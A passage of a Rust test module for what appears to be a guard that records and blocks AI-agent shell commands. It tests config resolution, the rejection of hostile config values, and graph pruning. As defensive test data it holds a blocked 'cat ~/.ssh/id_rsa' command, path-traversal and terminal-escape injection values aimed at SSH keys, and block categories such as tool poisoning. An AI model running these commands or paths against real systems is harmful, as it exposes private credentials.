            .any(|c| c.name == "privilege-escalation" && c.count == 2));
        // recent blocks, newest first, with their categories + session.
        assert_eq!(o.recent_blocks.len(), 2);
        assert_eq!(o.recent_decisions.len(), 4);
        assert_eq!(o.recent_blocks[0].command, "cat ~/.ssh/id_rsa");
        assert_eq!(o.recent_blocks[0].session, "s1");
        assert!(o.recent_blocks[1]
            .categories
            .contains(&"tool-poisoning".to_string()));
    }

    #[test]
    fn overview_truncates_recent_blocks() {
        let mut g = Graph::new();
        for i in 0..5 {
            g.ingest_verdict("s", i, &format!("bad {i}"), &deny());
        }
        assert_eq!(g.overview(3).recent_blocks.len(), 3);
        assert_eq!(g.overview(3).blocked, 5); // count is total, list is capped
    }

    #[test]
    fn overview_empty_graph_is_zeroed() {
        let o = Graph::new().overview(10);
        assert_eq!(o.commands, 0);
        assert!(
            o.top_categories.is_empty()
                && o.recent_blocks.is_empty()
                && o.recent_decisions.is_empty()
        );
    }

    #[test]
    fn next_seq_counts_per_session() {
        let mut g = Graph::new();
        assert_eq!(g.next_seq("s1"), 0);
        g.ingest_verdict(
            "s1",
            g.next_seq("s1"),
            "a",
            &json!({"recommendation":"allow"}),
        );
        assert_eq!(g.next_seq("s1"), 1);
        g.ingest_verdict("s1", g.next_seq("s1"), "b", &deny());
        assert_eq!(g.next_seq("s1"), 2);
        assert_eq!(g.next_seq("other"), 0); // per-session
    }

    fn env<'a>(pairs: &'a [(&'a str, &'a str)]) -> impl Fn(&str) -> Option<String> + 'a {
        move |k| {
            pairs
                .iter()
                .find(|(kk, _)| *kk == k)
                .map(|(_, v)| v.to_string())
        }
    }

    fn config(graph_file: &str) -> ProductConfig {
        ProductConfig::Present(format!("graph_file = \"{graph_file}\"\n"))
    }

    /// `graph_path` takes a READER, not a value, so an explicit override never
    /// touches the filesystem. In a test the read has already happened.
    fn given(config: ProductConfig) -> impl FnOnce() -> ProductConfig {
        move || config
    }

    #[test]
    fn graph_path_prefers_override_then_home() {
        assert_eq!(
            graph_path(
                env(&[("IW_GRAPH_FILE", "/tmp/g.json")]),
                given(ProductConfig::Absent)
            )
            .path,
            Some(std::path::PathBuf::from("/tmp/g.json"))
        );
        assert_eq!(
            graph_path(env(&[("HOME", "/home/x")]), given(ProductConfig::Absent)).path,
            Some(std::path::PathBuf::from(
                "/home/x/.config/innerwarden/graph.json"
            ))
        );
        assert_eq!(
            graph_path(
                env(&[("IW_GRAPH_FILE", "/o.json"), ("HOME", "/home/x")]),
                given(ProductConfig::Absent)
            )
            .path,
            Some(std::path::PathBuf::from("/o.json"))
        );
        assert_eq!(
            graph_path(env(&[]), given(ProductConfig::Absent)).path,
            None
        );
        assert_eq!(
            graph_path(
                env(&[("IW_GRAPH_FILE", "  ")]),
                given(ProductConfig::Absent)
            )
            .path,
            None
        );
    }

    /// THE RESOLUTION ORDER spec-052 requires, and it has to hold with NO
    /// environment variable set: the free CLI is launched by AI-agent hooks and
    /// by an MCP client, neither of which sources a shell profile, so a fix that
    /// needs `IW_GRAPH_FILE` exported is not a fix.
    ///
    /// FAILS ON REVERT: delete the `ProductConfig::Present` arm from
    /// [`graph_path`] and the middle case falls through to the home, which is
    /// the file the paid agent cannot read.
    #[test]
    fn a_product_config_beats_the_home_and_loses_to_the_explicit_override() {
        let shared = "/var/lib/innerwarden/guard/graph.json";

        // No variable anywhere. This is the hook and the MCP proxy.
        let resolved = graph_path(env(&[("HOME", "/home/op")]), given(config(shared)));
        assert_eq!(resolved.path, Some(std::path::PathBuf::from(shared)));
        assert_eq!(resolved.source, GraphPathSource::ProductConfigFile);
        assert_eq!(resolved.config_problem, None);

        // An explicit override still wins, so `contain` and the test suite can
        // keep redirecting the record.
        let overridden = graph_path(
            env(&[("IW_GRAPH_FILE", "/tmp/o.json"), ("HOME", "/home/op")]),
            given(config(shared)),
        );
        assert_eq!(
            overridden.path,
            Some(std::path::PathBuf::from("/tmp/o.json"))
        );
        assert_eq!(overridden.source, GraphPathSource::EnvironmentOverride);

        // No paid product installed: nothing changes, the record stays home.
        let alone = graph_path(env(&[("HOME", "/home/op")]), given(ProductConfig::Absent));
        assert_eq!(
            alone.path,
            Some(std::path::PathBuf::from(
                "/home/op/.config/innerwarden/graph.json"
            ))
        );
        assert_eq!(alone.source, GraphPathSource::OperatorHome);
        assert_eq!(alone.config_problem, None);
    }

    /// Every hostile or broken shape of the config file, and the documented
    /// outcome for each. The contract is not only "fall back": it is "fall back
    /// AND report", because a silent fallback puts the free CLI's writes and the
    /// paid agent's reads on two different files, which is the defect itself.
    ///
    /// FAILS ON REVERT: return the home path with `config_problem: None` for a
    /// present-but-unusable file and every case below fails on the assertion
    /// that the split was reported.
    #[test]
    fn a_config_that_cannot_be_honoured_falls_back_and_says_so() {
        let cases: &[(&str, ProductConfig)] = &[
            (
                "config_malformed",
                ProductConfig::Present("graph_file =".into()),
            ),
            (
                "config_malformed",
                ProductConfig::Present("graph_file = 42\n".into()),
            ),
            (
                "config_missing_graph_file",
                ProductConfig::Present(String::new()),
            ),
            (
                "config_missing_graph_file",
                ProductConfig::Present("# only a comment\n".into()),
            ),
            ("config_graph_file_empty", config("")),
            ("config_graph_file_padded", config(" /var/lib/x.json")),
            (
                "config_graph_file_not_absolute",
                config("var/lib/innerwarden/guard/graph.json"),
            ),
            ("config_graph_file_not_a_file", config("/var/lib/guard/")),
            ("config_graph_file_not_a_file", config("/")),
            (
                "config_graph_file_parent_traversal",
                config("/var/lib/innerwarden/../../home/op/.ssh/id_ed25519"),
            ),
            // The reader's own refusals travel through unchanged.
            (
                "config_is_a_symlink",
                ProductConfig::Refused("config_is_a_symlink"),
            ),
            (
                "config_is_writable_by_others",
                ProductConfig::Refused("config_is_writable_by_others"),
            ),
        ];

        for (code, config) in cases {
            let resolved = graph_path(env(&[("HOME", "/home/op")]), given(config.clone()));
            assert_eq!(
                resolved.path,
                Some(std::path::PathBuf::from(
                    "/home/op/.config/innerwarden/graph.json"
                )),
                "{code}: an unusable config must not stop the free product recording"
            );
            assert_eq!(resolved.source, GraphPathSource::OperatorHome, "{code}");
            let problem = resolved
                .config_problem
                .unwrap_or_else(|| panic!("{code}: the split must be reported, never silent"));
            assert_eq!(problem.code, *code);
            assert!(
                problem.message.contains(GUARD_CONFIG_PATH)
                    && problem.message.contains(code)
                    && problem.message.contains("cannot read them"),
                "{code}: the message must name the file, the reason and the cost: {}",
                problem.message
            );
        }
    }

    /// A control character in the configured path is rejected rather than
    /// carried: the value comes from a file this process does not own, and a
    /// newline in it would be pasted straight into operator-visible output.
    #[test]
    fn control_characters_and_over_long_paths_are_rejected() {
        assert_eq!(
            parse_product_config("graph_file = \"/var/lib/a\\nb.json\"\n"),
            Err("config_graph_file_control_character")
        );
        let long = format!("/var/{}.json", "a".repeat(MAX_GRAPH_FILE_CHARS));
        assert_eq!(
            parse_product_config(&format!("graph_file = \"{long}\"\n")),
            Err("config_graph_file_too_long")
        );
        let oversized = format!(
            "graph_file = \"/var/lib/x.json\"\n#{}",
            "p".repeat(MAX_PRODUCT_CONFIG_BYTES as usize)
        );
        assert_eq!(parse_product_config(&oversized), Err("config_too_large"));
    }

    /// The shape the paid installer writes, plus the forward compatibility that
    /// keeps an older CLI working against a newer installer: an unknown key must
    /// be ignored, not turned into a silent return to the home.
    #[test]
    fn the_installer_shape_parses_including_comments_and_future_keys() {
        let text = "\
# Written by the InnerWarden Active Defence installer.
# Both products read this file; do not edit by hand.
graph_file = \"/var/lib/innerwarden/guard/graph.json\"
events_file = \"/var/lib/innerwarden/guard/guard-events.jsonl\"
";
        assert_eq!(
            parse_product_config(text),
            Ok(std::path::PathBuf::from(
                "/var/lib/innerwarden/guard/graph.json"
            ))
        );
        assert_eq!(
            parse_product_config("graph_file = '/var/lib/innerwarden/guard/graph.json'"),
            Ok(std::path::PathBuf::from(
                "/var/lib/innerwarden/guard/graph.json"
            ))
        );
    }

    /// The reported message is printed to a hook's stderr, so it must not become
    /// a channel for whatever the config file contains.
    #[test]
    fn the_reported_message_never_echoes_the_configured_value() {
        let hostile = "/var/lib/\u{1b}[2Jsecret-looking-value";
        let resolved = graph_path(env(&[("HOME", "/home/op")]), given(config(hostile)));
        let problem = resolved.config_problem.expect("reported");
        assert!(!problem.message.contains("secret-looking-value"));
        assert!(!problem.message.contains('\u{1b}'));
    }

    /// With nowhere to fall back to, the message must not claim the record went
    /// to the home. A wrong remedy is worse than none.
    #[test]
    fn with_no_home_the_message_says_nothing_is_being_recorded() {
        let resolved = graph_path(env(&[]), given(ProductConfig::Refused("config_unreadable")));
        assert_eq!(resolved.path, None);
        assert_eq!(resolved.source, GraphPathSource::Unresolved);
        let problem = resolved.config_problem.expect("reported");
        assert!(problem.message.contains("not being recorded"));
        assert!(!problem.message.contains("operator home"));
    }

    #[test]
    fn short_truncates_long_commands() {
        let long = "a".repeat(200);
        let mut g = Graph::new();
        g.ingest_verdict("s", 0, &long, &json!({"recommendation": "allow"}));
        let cmd = g.nodes.iter().find(|n| n.kind == "command").unwrap();
        assert!(cmd.label.chars().count() <= 120);
        assert!(cmd.label.ends_with('…'));
    }
}

#[cfg(test)]
mod prune_tests {
    use super::*;

    fn node(id: &str) -> Node {
        Node {
            id: id.into(),
            kind: "command".into(),
            label: id.into(),
            attrs: Default::default(),
        }
    }

    /// REGRESSION ANCHOR for UNSF-05. Readers were bounded, the STORE was not,
    /// so the file grew for the life of the install.
    ///
    /// FAILS ON REVERT: make `prune` a no-op and the length assertion trips.
    ///
    /// Skipped under miri: 20k nodes is volume, and volume is the one thing an
    /// interpreter cannot do cheaply. See the note on
    /// `prune_bounds_the_serialised_size_not_only_the_node_count`.
    #[test]
    #[cfg_attr(miri, ignore)]
    fn the_store_is_capped_and_drops_the_oldest() {
        let mut g = Graph::new();
        for i in 0..(Graph::MAX_NODES + 500) {
            g.upsert_node(node(&format!("n{i:06}")));
        }
        let dropped = g.prune();
        assert_eq!(dropped, 500);
        assert_eq!(g.nodes.len(), Graph::MAX_NODES);
        assert!(
            g.nodes.iter().all(|n| n.id != "n000000"),
            "the oldest node must be the one dropped"
        );
        assert!(
            g.nodes
                .iter()
                .any(|n| n.id == format!("n{:06}", Graph::MAX_NODES + 499)),
            "the newest node must survive"
        );
    }

    /// REGRESSION ANCHOR. `next_seq` counted a session's command nodes, so once
    /// pruning removed any of them the next command reused an id that was still
    /// in use, and `upsert_node` overwrote that surviving command in place. The
    /// newest activity then appeared in the middle of the history and an older
    /// entry was destroyed. Nothing surfaced it; the record simply lied.
    ///
    /// Pruning is what makes this reachable, so the two ship together.
    ///
    /// FAILS ON REVERT: count the nodes again and the id collides.
    #[test]
    fn a_pruned_session_never_reuses_a_command_id() {
        let mut g = Graph::default();
        for seq in 0..10 {
            g.ingest_verdict("s", seq, &format!("cmd {seq}"), &serde_json::json!({}));
        }
        // Whatever removes old material - prune, a partial restore, a manual
        // edit - the surviving ids are what matter, not how many there are.
        g.nodes.retain(|n| n.id != "cmd:s:0" && n.id != "cmd:s:1");

        let next = g.next_seq("s");
        assert_eq!(next, 10, "must continue past the highest id, not the count");
        assert!(
            !g.nodes.iter().any(|n| n.id == format!("cmd:s:{next}")),
            "the next id must be free, or the new command overwrites a real one"
        );

        g.ingest_verdict("s", next, "the newest command", &serde_json::json!({}));
        let survivors: Vec<&str> = g
            .nodes
            .iter()
            .filter(|n| n.kind == "command")
            .map(|n| n.label.as_str())
            .collect();
        assert!(survivors.contains(&"the newest command"));
        assert!(
            survivors.contains(&"cmd 8"),
            "an existing command must not be overwritten by the new one"
        );
    }

    /// REGRESSION ANCHOR, from a real outage on 2026-08-05.
    ///
    /// The node cap alone does not bound the FILE. A real install reached
    /// 21,510 nodes / 16,777,528 bytes: past the 16 MiB limit its own writer
    /// applied, so the verification read failed and the prune that would have
    /// rescued it could never run. Recording stopped for six hours.
    ///
    /// Even at exactly MAX_NODES that graph serialised to ~15.6 MB, close
    /// enough that one long command puts it over again. So the store must be
    /// bounded in BYTES, not only in node count.
    ///
    /// FAILS ON REVERT: drop the byte budget from `prune` and this graph stays
    /// over the limit, exactly as the user's did.
    ///
    /// Skipped under miri, and the reason is worth writing down because it cost
    /// a week of nightly runs. This test has to build ~14 MB (20k nodes with
    /// 700-byte labels) to reproduce "inside the node cap, over the byte
    /// budget", and `prune` then serialises the whole graph on each pass of its
    /// shrink loop. Native that is a moment; under an interpreter it does not
    /// finish, so the nightly `miri` job ran to the 6-hour platform cap and was
    /// killed every night from 2026-08-06 to 2026-08-12. The run showed as
    /// "cancelled", which reads as harmless, so nothing was checked for UB the
    /// whole time.
    ///
    /// Nothing is lost by skipping it here: neither this crate nor `notify`
    /// contains a single `unsafe` block, and what miri is for is exercised by
    /// the other 26 tests, which run in about a second.
    #[test]
    #[cfg_attr(miri, ignore)]
    fn prune_bounds_the_serialised_size_not_only_the_node_count() {
        let mut g = Graph::default();
        // 700-byte commands are what the real graph held; 20k of them is inside
        // the node cap and outside any sane byte budget.
        let long = "x".repeat(700);
        for i in 0..Graph::MAX_NODES {
            let mut n = node(&format!("n{i:06}"));
            n.label = format!("{long}{i}");
            g.upsert_node(n);
        }
        assert_eq!(g.nodes.len(), Graph::MAX_NODES, "still inside the node cap");
        assert!(
            g.to_json().len() > Graph::MAX_BYTES,
            "the setup must reproduce the real shape: at the node cap and over the byte budget"
        );

        let dropped = g.prune();

        assert!(dropped > 0, "a node cap alone would have dropped nothing");
        assert!(
            g.to_json().len() <= Graph::MAX_BYTES,
            "the store must come back under its own budget, or every later write fails"
        );
        assert!(
            g.nodes
                .iter()
                .any(|n| n.id == format!("n{:06}", Graph::MAX_NODES - 1)),
            "the newest activity must survive: it is what the dashboard shows"
        );
    }

    /// An edge pointing at a pruned node would render as a relationship to
    /// something the reader cannot resolve, so it goes with it.
    ///
    /// Skipped under miri for the same reason as its two neighbours: 20k nodes.
    /// This one is why the guard below exists — skipping the other two was not
    /// enough, the nightly simply hung here instead, and only running miri for
    /// real showed it.
    #[test]
    #[cfg_attr(miri, ignore)]
    fn edges_that_would_dangle_are_removed_with_their_node() {
        let mut g = Graph::new();
        for i in 0..(Graph::MAX_NODES + 2) {
            g.upsert_node(node(&format!("n{i:06}")));
        }
        g.add_edge("n000000", "n000001", "ran");
        let survivor = format!("n{:06}", Graph::MAX_NODES + 1);
        g.add_edge(&survivor, &survivor, "self");
        g.prune();
        assert!(
            !g.edges.iter().any(|e| e.from == "n000000"),
            "an edge from a pruned node must not survive"
        );
        assert!(
            g.edges.iter().any(|e| e.from == survivor),
            "an edge between surviving nodes must be kept"
        );
    }

    /// A cap-scale test must carry `#[cfg_attr(miri, ignore)]`.
    ///
    /// Miri interprets every operation, so building 20k nodes there does not
    /// finish. The nightly `miri` job had no time budget, so it ran to GitHub's
    /// 6-hour platform cap and was killed every night from 2026-08-06 to
    /// 2026-08-12, reporting "cancelled" — which reads as harmless. Nothing was
    /// checked for undefined behaviour for a week, and nothing said so.
    ///
    /// Skipping the two obvious offenders was NOT enough: the run simply hung
    /// on a third, and that only surfaced by running miri for real. Hence a
    /// check rather than a habit — the next cap-scale test added here would
    /// otherwise re-break the nightly silently.
    ///
    /// Volume costs nothing under miri anyway: neither this crate nor `notify`
    /// has a single `unsafe` block, and the remaining tests cover the same code
    /// paths in about a second.
    #[test]
    fn a_cap_scale_test_must_be_skipped_under_miri() {
        let source = include_str!("lib.rs");

        // Split on the attribute so each chunk ends with one test's body, then
        // look back at the attributes that introduced it.
        let mut offenders = Vec::new();
        for block in source.split("\n    #[test]\n").skip(1) {
            let (attrs_and_sig, body) = match block.split_once('{') {
                Some(p) => p,
                None => continue,
            };
            let name = attrs_and_sig
                .lines()
                .find_map(|l| l.trim().strip_prefix("fn "))
                .map(|s| s.split('(').next().unwrap_or(s).to_string())
                .unwrap_or_default();
            // Cut at the function's own closing brace. Reading past it lands in
            // the NEXT test's doc comment, and one of those mentions MAX_NODES
            // in prose — which flagged an innocent test on the first attempt.
            let body = body.split("\n    }").next().unwrap_or(body);
            // Prose does not build a graph, so ignore comments entirely.
            let code: String = body
                .lines()
                .filter(|l| {
                    let t = l.trim_start();
                    !t.starts_with("//")
                })
                .collect::<Vec<_>>()
                .join("\n");
            let cap_scale = code.contains("MAX_NODES");
            let skipped = attrs_and_sig.contains("cfg_attr(miri, ignore)");
            if cap_scale && !skipped && name != "a_cap_scale_test_must_be_skipped_under_miri" {
                offenders.push(name);
            }
        }

        assert!(
            offenders.is_empty(),
            "these tests build MAX_NODES-scale graphs but are not skipped under \
             miri, so the nightly undefined-behaviour job will hang until the \
             6-hour platform cap kills it and report only \"cancelled\": {}",
            offenders.join(", ")
        );
    }

    /// Under the cap, pruning must change nothing at all.
    #[test]
    fn a_small_graph_is_untouched() {
        let mut g = Graph::new();
        g.upsert_node(node("a"));
        g.upsert_node(node("b"));
        g.add_edge("a", "b", "ran");
        assert_eq!(g.prune(), 0);
        assert_eq!(g.nodes.len(), 2);
        assert_eq!(g.edges.len(), 1);
    }
}
